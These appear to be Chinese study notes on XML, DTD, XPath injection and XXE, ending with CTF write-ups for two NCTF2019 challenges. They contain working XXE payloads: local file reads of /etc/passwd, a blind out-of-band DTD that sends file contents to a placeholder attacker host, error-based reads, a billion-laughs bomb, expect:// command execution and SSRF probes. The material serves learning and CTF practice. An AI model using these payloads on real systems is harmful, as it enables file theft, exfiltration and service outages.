# XXE

XML External Entity Injection    

**XML外部实体注入**

## XML

### 什么是XML

指**可扩展标记语言**，设计宗旨是**传输数据**，而不是显示数据，是W3C（确保在不同浏览器、不同设备上看到的网页，都能正常显示和交互）的推荐标准，XML不会做任何事情，其被设计**用来结构化、存储以及传输信息**，XML语言没有预定义的标签

### 与HTML之间的差异

XML（传输信息）：被设计用来传输和存储数据，其焦点是数据的内容

HTML（显示信息）：被设计用来显示数据，其焦点是数据的外观

**XML就是为了让不同系统、不同语言之间能“无障碍对话”而设计的结构化数据格式**

### 基本格式及语法

**基本格式**

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!--xml文件的声明-->
<!--称为XML prolog，用于声明XML文档的版本和编码，是可选的，必须放在文档的开头-->

<bookstore>                                                 <!--根元素-->
<book category="COOKING">        <!--bookstore的子元素，category为属性-->
<title>Everyday Italian</title>           <!--book的子元素，lang为属性-->
<author>Giada De Laurentiis</author>                  <!--book的子元素-->
<year>2005</year>                                     <!--book的子元素-->
<price>30.00</price>                                  <!--book的子元素-->
</book>                                                 <!--book的结束-->
</bookstore>                                       <!--bookstore的结束-->
```

standalone值是yes的时候表示DTD仅用于验证文档结构，其默认值是no，而且有些parser（解析器）会直接忽略这一点

**基本语法**

所有XML元素都需要有关闭标签，当一对标记之间没有任何文本内容时，可以不写结束标记，在开始标记的末尾加上斜杠“/”来确认，例如：`<test />` 这样的标记被称为“空标记”

标签对大小写敏感

必须正确的嵌套

XML文档必须有根元素

标记中可以包含任意多个属性，在标记中，属性以名称/取值对出现，属性名不能重复，名称与取值之间用“=”分隔，XML的属性值必须加引号，

若多个字符需要转义，则可以将这些内容存放到CDATA里面

```xml
<!CDATA[内容]>
```

### xxe和xml注入区别

**XML注入**：攻击者把恶意内容插入xml文档里，破坏原本结构或语法

重点是“输入污染了XML数据本身”

**XXE**：攻击者利用xml的DOCTYPE和“外部实体”机制，让解析器去读取本地文件、发起请求，甚至造成ssrf、文件泄露、Dos

重点是“利用了解析器对外部实体的处理能力”

#### 对比

xml注入示例：

```xml
<user><name>alice</name></user>
```

如果程序把用户输入直接拼进去，攻击者输入

`</name><admin>true</admin><name>`

结果可能变为

`<user><name></name><admin>true</admin><name></name></user>` 

这属于篡改xml结构或业务含义

xxe示例：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

如果解析器允许外部实体，`&xxe`会被展开，本地文件内容就可能被读出来

**攻击目标不同**

- `XML 注入`：改数据、改节点、绕过校验、污染业务逻辑
- `XXE`：读文件、打内网、SSRF、探测服务、DoS

**触发条件不同**

- `XML 注入`：通常是程序把用户输入直接拼接进 XML
- `XXE`：通常是解析器开启了 `DOCTYPE / ENTITY / 外部实体解析`

**关系**

- 不是所有 XML 注入都是 XXE
- XXE 通常依赖恶意 XML 负载，可以视为和 XML 注入相关，但它更准确地说是“外部实体注入/解析器配置漏洞”

**防护也不同**

- 防 XML 注入：
  不要字符串拼接 XML，使用安全的 XML builder/serializer，对用户输入做转义
- 防 XXE：
  禁用 `DOCTYPE`
  禁用外部实体
  禁用外部 DTD
  使用安全解析配置

## DTD

Document Type Defintion，文档类型定义

是XML的“语法约束说明书”

作用是给XML定规则

举例：

```xml
<note>
  <to>Y0u</to>
  <from>@re</from>
  <head>v3ry</head>
  <body>g00d!</body>
</note>
```

如果只看xml语法，它只要求“标签能正常闭合”

但并不知道：note下是不是必须有to、from、head、body，标签顺序是否固定、能不能多一个<age>、body里面是放文本还是其他的标签

DTD可以解决这些问题

例如：

```xml
<!DOCTYPE note [
  <!ELEMENT note (to,from,head,body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT head (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

意思是：根元素是note、note内部必须按顺序包含to、from、head、body，这四个子元素里放的是文本

DTD解决的是“合法性”和“规范性”

### 内部DTD和外部DTD区别

**内部DTD**：规则直接写在xml文件里

```xml
<!DOCTYPE 根元素[定义内容]>
例：
<!DOCTYPE note [
  <!ELEMENT note (to,from,head,body)>
]>
```

特点：文件自包含、不利于多个xml共用同一套规则

**外部DTD**：规则单独放在`.dtd`文件里，再由xml引入

```xml
<!DOCTYPE 根元素 SYSTEM "DTD文件路径">
例：
<!DOCTYPE note SYSTEM "test.dtd">
```

特点：规则和数据分离、多个xml可以共用一个DTD

**内外部DTD文档结合**

```xml
<!DOCTYPE 根元素 SYSTEM "DTD文件路径" [定义内容]>
```

### PCDATA

Parsed Character Data，会被解析器解析的文本数据

例如

```xml
<!ELEMENT to (#PCDATA)>
```

表示to元素里放的是普通文本，并且文本中的实体引用会被解析

例：

`<to>Tom &amp; Jerry</to>`解析后：`Tom & Jerry`

在PCDATA中，`<`、`&`这些符号不能直接写，必须转义，否则解析器会误会

特点：内容是文本、实体会展开、标签符号仍然有语法意义、不能随便直接写`<`、`&`

### 实体引用

xml里面的`<tag>...</tag>`中的`<`和`>`本身就是标记符号

如果写`<body>1 < 2</body>`

解析器会把`<2`误认为新标签开头，导致解析失败

所以 XML 规定，特殊字符要写成实体引用：

- `<` 写成 `<`
- `>` 写成 `>`
- `&` 写成 `&`
- `'` 写成 `'`
- `"` 写成 `"`

例如`<body>1 &lt; 2 &amp; 3 &gt; 1</body>`

**实体引用不只是转义，也能“像宏一样复用”**

DTD还可以自定义实体，例：

```xml
<!DOCTYPE note [
  <!ENTITY writer "Alice">
]>
<note>
  <from>&writer;</from>
</note>
```

解析时，`&writer`会被替换成`Alice`

这有点像：宏替换、常量复用、文件包换（某些外部实体场景下）

DTD除了约束标签结构，也能定义可复用内容

#### 内部实体

几乎没有什么利用价值

```html
<!ENTITY 实体名称 "实体的值">

例如：
<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY xxe "hello">
]>
<foo>&xxe;</foo>
```

#### 外部实体

```html
有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，
外部实体的引用可以利用如下协议
file:///path/to/file.ext
http://url/file.ext
php://filter/read=convert.base64-encode/resource=conf.php

例如:
<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" >
%xxe;
]>
<foo>&evil;</foo>

外部evil.dtd中的内容
<!ENTITY evil SYSTEM “file:///d:/1.txt” >
```

`%xxe`执行后会加载外部实体`evil.dtd`并执行

### CDATA

Character Data，一段“不再继续按xml标记规则解析”的原样文本

写法

```xml
<![CDATA[
这里面的 <tag> 不会被当成标签
这里面的 &lt; 也不会被当成实体展开
]]>
```

例：`<body><![CDATA[ if (a < b && b > c) { alert("ok"); } ]]></body>`

特点：内容会原样保留、不解析标签、不展开实体，适合放代码片段和大段特殊字符文本

### PCDATA和CDATA区别

前者会被解析器解析，后者不会

用 PCDATA：

- 普通文本内容
- 希望实体能正常解析
- 文本本身不包含大量特殊符号

用 CDATA：

- 文本里有大量 <、>、&
- 要嵌入脚本、SQL、HTML 片段、代码片段
- 不想手动转义很多字符

## Xpath注入

本质上和sql注入很像，只不过注入是目标不是sql查询，而是Xpath表达式

如果应用把用户输入直接拼进Xpath查询里，攻击者可能：绕过登录、越权读取xml中的其他数据、改变查询逻辑、推断节点内容

**Xpath是用来在xml文档里定位节点的语言**

### 本地环境搭建测试

book.xml

```xml
<?xml version="1.0" encoding="utf-8" ?>
<bookstore>
  <book>
    <bookid>001</bookid>
    <bookname>C语言从入门到精通</bookname>
    <price>38</price>
  </book> 
  <book>
    <bookid>002</bookid>
    <bookname>GO语言从入门到放弃</bookname>
    <price>28</price>
  </book>   
  <book>
    <bookid>003</bookid>
    <bookname>ASP.NET网站开发</bookname>
    <price>48</price>
  </book> 
  <book>
    <bookid>004</bookid>
    <bookname>WinFrom开发桌面应用程序</bookname>
    <price>58</price>
  </book> 
  <book>
    <bookid>005</bookid>
    <bookname>JAVA编程思想</bookname>
    <price>65</price>
  </book> 
  <book>
    <bookid>006</bookid>
    <bookname>C#面向对象程序设计</bookname>
    <price>45</price>
  </book>  
</bookstore>
```

若需要查询编号为001的图书对应的书名，则Xpath语句为：`/bookstore/book[bookid/text()='001' ]/bookname`

下面用JavaScript来查询，代码如下

booklist.html

```html
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title></title>
    <meta charset="utf-8" />
</head>
<body>
    <script type="text/javascript">
        function loadXMLDoc(dname) {
            if (window.XMLHttpRequest) {
                xhttp = new XMLHttpRequest();
            }
            else {
                xhttp = new ActiveXObject("Microsoft.XMLHTTP");
            }
            xhttp.open("GET", dname, false);
            xhttp.send("");
            return xhttp.responseXML;
        }
        xml = loadXMLDoc("book.xml");
        path = "/bookstore/book[bookid/text()='001' ]/bookname";
        if (window.ActiveXObject) {
            var nodes = xml.selectNodes(path);
            for (i = 0; i < nodes.length; i++) {
                document.write(nodes[i].childNodes[0].nodeValue);
                document.write("<br />");
            }
        }
        else if (document.implementation && document.implementation.createDocument) {
            var nodes = xml.evaluate(path, xml, null, XPathResult.ANY_TYPE, null);
            var result = nodes.iterateNext();
            while (result) {
                document.write(result.childNodes[0].nodeValue);
                document.write("<br />");
                result = nodes.iterateNext();
            }
        }
    </script>
</body>
</html>
```

结果

![image-20260726144728603](../../typore图片/image-20260726144728603.png)

假设可以控制Xpath语句，那么可以使用之前提到的`or 1=1`遍历全部的bookname，代码如下

`/bookstore/book[bookid/text()='001' or 1=1]]/bookname`

```html
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title></title>
    <meta charset="utf-8" />
</head>
<body>
    <script type="text/javascript">
        function loadXMLDoc(dname) {
            if (window.XMLHttpRequest) {
                xhttp = new XMLHttpRequest();
            }
            else {
                xhttp = new ActiveXObject("Microsoft.XMLHTTP");
            }
            xhttp.open("GET", dname, false);
            xhttp.send("");
            return xhttp.responseXML;
        }
        xml = loadXMLDoc("book.xml");
        path = "/bookstore/book[bookid/text()='001' or 1=1]]/bookname";     
        if (window.ActiveXObject) {
            var nodes = xml.selectNodes(path);
            for (i = 0; i < nodes.length; i++) {
                document.write(nodes[i].childNodes[0].nodeValue);
                document.write("<br />");
            }
        }
        else if (document.implementation && document.implementation.createDocument) {
            var nodes = xml.evaluate(path, xml, null, XPathResult.ANY_TYPE, null);
            var result = nodes.iterateNext();
            while (result) {
                document.write(result.childNodes[0].nodeValue);
                document.write("<br />");
                result = nodes.iterateNext();
            }
        }
    </script>
</body>
</html>
```

结果

![image-20260726145650593](../../typore图片/image-20260726145650593.png)

## XXE

XML外部实体注入

XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等

触发的点：可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件

解析xml在php库libxml，libxml>=2.9.0的版本中没有XXE漏洞

`simp;exml_load_string()`可以读取xml

### 特征

url后缀是`.ashx`

响应体是xml

**XXE测试**

在线工具

http://ceye.io/

http://www.dnslog.cn/

https://dnslog.io/

任意文件读取测试

### 漏洞攻击方式

与SQL注入的攻击方式有一点相似，分为有回显和无回显

有回显：可以直接在页面中看到payload的执行结果或现象

无回显：又称为blind xxe（类似于布尔盲注、时间盲注），可以使用外带数据（OOB，Out-of-Band Data）通道提取数据

注：外带数据（OOB，Out-of-Band Data），通过另一条“旁路”通道，把无法看到的数据偷传出来

#### 文件读取

**有回显**

有回显测试源码

```php
<?php
$xml=simplexml_load_string($_GET['xml']);
print_r((string)$xml);//有回显
?>
```

`simplexml_load_string`解析接收过来的XML代码

payload

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY file SYSTEM "file://D:/phpStudy/phpStudy_64/phpstudy_pro/WWW/22.txt">]>
<root>&file;</root>
```

**无回显-加载远程DTD**

无回显的文件读取可以通过blind XXE方法外带数据通道（OOB）来提取数据

过程：先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接收数据发服务器来读取数据。虽然无法直接查看文件内容，但我们仍然可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码

payload

```php
<?xml version="1.0"?>
<!DOCTYPE test[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/1.txt">
<!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx.xxx/evil.xml">
%dtd;
%send;
]>
```

evil.xml

```xml
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx/?content=%file;'>"> %payload;
//%号要进行实体编码成&#x25
```

先%dtd请求远程服务器（攻击机）上的evil.xml，然后%payload调用了%file，%file获取对方服务器上的敏感文件，最后替换%send，数据被发送到远程的服务器，就实现了数据外带

**无回显-加载本地DTD**

如果目标有防火墙等设备，阻止了对外连接，可以采用基于错误回显的xxe

```xml
<?xml version="1.0" ?>
<!DOCTYPE messege [
  <!ENTITY % local_dtd SYSTEM "file:///opt/IBM/Websphere/AppServer/properties/sip-app10.dtd">
//加载IBM WebSphere应用服务器上的合法DTD文件（利用现有DTD中的实体定义，避免触发“外部实体禁用”的限制）
  <!ENTITY % condition'aaa)>//制造解析错误，触发DTD解析器的不同行为模式
    <!ENTITY &#x25;file SYSTEM "file:///etc/passwd">SYSTEM &#x27;<!ENTITY &#x25; eval " 
    <!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;   //&#x25是%的HTML实体编码，定义参数实体%file，读取/etc/passwd文件
    &#x25;error;  //嵌套定义%error实体，引用不存在的路径
    <!ENTITY aa (bb'>//进一步扰乱解析器
  %local_dtd;
]>
<message>any text</message>
```

/opt/IBM/Websphere/AppServer/properties/sip-app10.dtd 是websphere上默认存在的dtd，可以通过加载它触发报错返回读取文件的内容

**报错XXE（辅助利用，快速获取信息）**

核心特点：利用XML解析器的报错机制，构造恶意外部实体，让解析器报错，报错信息中包含敏感数据（如文件内容、内网IP），无需回显和外带数据，适合无法直接获取回显的场景

常见方式：通过引用不存在的文件、畸形外部实体，触发解析器报错，报错信息中会泄露文件路径、文件内容等敏感信息

#### Dos攻击

常见的XML炸弹：当XML解析器尝试解析该文件时，由于DTD的定义指数级展开，这个1K不到的文件会占用到3G的内存

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

**原理**：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。

#### 命令执行

在php环境中，xml命令执行需要php装有expect扩展，但该扩展默认没有安装，所以命令执行是比较难利用的，但不排除

```php
<?php 
$xml = <<<EOF
<?xml version = "1.0"?>
<!DOCTYPE ANY [
  <!ENTITY f SYSTEM "except://ls">
]>
<x>&f;</x>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
```

payload

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
    <!ELEMENT name ANY>
    <!ENTITY xxe SYSTEM "expect://ifconfig">
]>
<root><name>&xxe;</name></root>

```

#### SSRF

触发点通常在ENTITY实体中

payload：

```xml
<?xml version="1.0" ?>
<!DOCTYPE ANY [
    <!ENTITY % ssrf SYSTEM "http://ip:port">
    %ssrf;
]>
```

如果解析器被允许通过HTTP(S)解析外部实体，攻击者可以利用XXE让服务器请求内部资源。这是一种SSRF，但通过xml解析器实现。

这一次，外部实体引用了一个内部HTTP资源

```http
POST http://example.com/xml HTTP/1.1

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
 <!ELEMENT foo ANY>
 <!ENTITY xxe SYSTEM "http://192.168.0.1/secret.txt">
]>
<foo>&xxe;</foo>
```

如果攻击成功，可以从本地网络返回secret.txt文件的内容

由于服务器从网络内部发出请求，基于XXE的SSRF可以绕过诸如IP允许列、边界防火墙和分段等保护措施，这些都假设外部用户无法访问内部服务。某些环境中，同一机制也可用于内部服务发现和有限端口探测，具体取决于连接失败的信号方式

#### RCE

执行远程代码/命令









## 题

### **[NCTF2019]Fake XML cookbook**

#### 文件读取注入

<img src="../../typore图片/image-20260726162519535.png" alt="image-20260726162519535" style="zoom:50%;" />

查看源码，发现是xml形式的数据，应该存在xxe注入

```html
$.ajax({
         type: "POST",
         url: "doLogin.php",
         contentType: "application/xml;charset=utf-8",
         data: data,
         dataType: "xml",
         anysc: false,
         success: function (result) {
         	var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
        	var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
         	if(code == "0"){
         		$(".msg").text(msg + " login fail!");
         	}else if(code == "1"){
         		$(".msg").text(msg + " login success!");
         	}else{
                $(".msg").text("error:" + msg);
         	}
         },
         error: function (XMLHttpRequest,textStatus,errorThrown) {
             $(".msg").text(errorThrown + ':' + textStatus);
         }
     });
```

抓包后确定请求时xml格式

构造 payload，如图中的 xml 格式

第一行先声明 XML 的版本（1.0）和编码（UTF-8）

然后声明 DOCTYPE，名字自取

然后再声明 ENTITY，名字自取

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note[
    <!ENTITY admin SYSTEM "file:///etc/passwd">
<!--SYSTEM 标识符表示外部实体引用一个外部资源，可以是文件或 URL，传过去拿到 flag-->
    ]>
<user>
    <username>
        &admin;
    </username>
    <password>
        123
    </password>
</user>
```

![image-20260726161924995](../../typore图片/image-20260726161924995.png)



![image-20260726161846368](../../typore图片/image-20260726161846368.png)

### **[NCTF2019]True XML cookbook**

[upfine的博客](https://www.cnblogs.com/upfine/p/16570120.html)

题目打开和上一道一样，源码里面没有得到什么有用的信息

bp抓包，尝试读取flag，并没有结果

然后尝试探测内网信息，读取系统内的配置文件信息看是否能发现有用的信息，包含：/etc/hosts、/proc/net/arp、/proc/net/fib_trie等

```xml
<?xml version="1.0" ?>
<!DOCTYPE llw [
<!ENTITY file SYSTEM  "file:///etc/hosts">
]>
<user>
	<username>&file;</username>
	<password>1</password>
</user>
```

/etc/hosts

![image-20260727170257449](../../typore图片/image-20260727170257449.png)

/proc/net/arp

![image-20260727170722685](../../typore图片/image-20260727170722685.png)

/proc/net/fib_trie

![image-20260727170640009](../../typore图片/image-20260727170640009.png)

得到了一个新地址10.42.1.255，尝试一下新的连接

```xml
<?xml version="1.0" ?>
<!DOCTYPE llw [
<!ENTITY file SYSTEM  "http://10.42.1.255/">
]>
<user>
	<username>&file;</username>
	<password>1</password>
</user>
```

![image-20260727171055984](../../typore图片/image-20260727171055984.png)

连接失败，那就查询一下同网段内存在不存在其他地址，使用bp的爆破模块进行爆破，设置如下：

![image-20260727173419534](../../typore图片/image-20260727173419534.png)

发送到intruder

![image-20260727173937267](../../typore图片/image-20260727173937267.png)

![image-20260727173649470](../../typore图片/image-20260727173649470.png)

![image-20260727173724114](../../typore图片/image-20260727173724114.png)

最后没有爆破出来
